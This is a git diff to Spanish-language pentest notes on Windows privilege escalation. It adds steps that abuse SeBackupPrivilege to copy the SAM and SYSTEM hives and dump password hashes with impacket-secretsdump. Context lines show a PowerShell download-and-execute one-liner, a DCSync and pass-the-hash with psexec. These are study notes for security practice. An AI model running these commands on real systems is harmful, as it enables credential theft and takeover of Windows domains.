@@ -128,6 +128,21 @@ Notas:
 	2. También se pude utilizar 'RottenPotato o JuicyPotato'
 ```
 
+```powershell
+3. 'SeBackupPrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
+
+
+Pasos:
+❯ mkdir C:\Temp        # Crear un directorio en la maquina Windows e ingresar a el        
+❯ reg save hklm\sam C:\temp\sam.hive            # Hacer una copia de la SAM al directorio creado y se descarga
+❯ reg save hklm\system C:\temp\system.hive      # Hacer una copia del system y se descarga 
+
+❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios
+
+Notas:
+	1. https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md      # Forma de explotar 
+```
+
 ## Grupos Windows para escalar 
 
 ```bash 
@@ -165,11 +180,10 @@ Pasos:
 
 
 Pasos:
-❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y y transferirlo a la máquina Windows comprometida
+❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el modulo 
 ❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
 ```
-
 
 ```powershell
 4. 'Account Operators' = Si se esta en el grupo con 'GenericAll' sobre 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si se tiene un usuario en el grupo 'Exchange Windows Permissions' con 'WriteDacl', se puede ejecutar un DCSync sobre el dominio para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
@@ -198,3 +212,4 @@ Notas:
 	# IP-DC = La dirección IP del DC  
 ❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
 ```
+
